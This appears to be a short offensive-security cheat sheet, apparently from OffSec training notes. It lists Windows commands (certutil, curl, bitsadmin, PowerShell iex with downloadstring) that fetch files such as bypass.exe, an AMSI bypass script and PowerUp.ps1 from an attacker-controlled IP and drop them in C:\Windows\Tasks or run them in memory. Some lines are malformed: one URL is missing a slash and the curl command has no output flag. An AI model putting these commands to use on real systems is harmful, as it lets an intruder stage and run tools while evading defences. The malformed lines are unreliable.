## Windows File Downloads

#### Certutil 
```
certutil -urlcache http://lhost/bypass.exe C:\Windows\Tasks\bypass.exe
```

#### Curl 
```
curl http://192.168.45.201/bypass.exe C:\Users\Offsec\bypass.exe
```

#### Bitsadmin 
```
bitsadmin /Transfer myJob http://192.168.45.201/file.txt C:\Windows\Tasks\file.txt
bitsadmin /create 1 bitsadmin /addfile 1 http://lhost/bypass.exe C:\Windows\Tasks\bypass.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
  reference: https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/

#### Powershell 
```
iex(new-object net.webclient).downloadstring('http://192.168.45.201amsi-reflect.ps1')
iex(new-object net.webclient).downloadstring('http://192.168.45.201/PowerUp.ps1'); Invoke-AllChecks
```
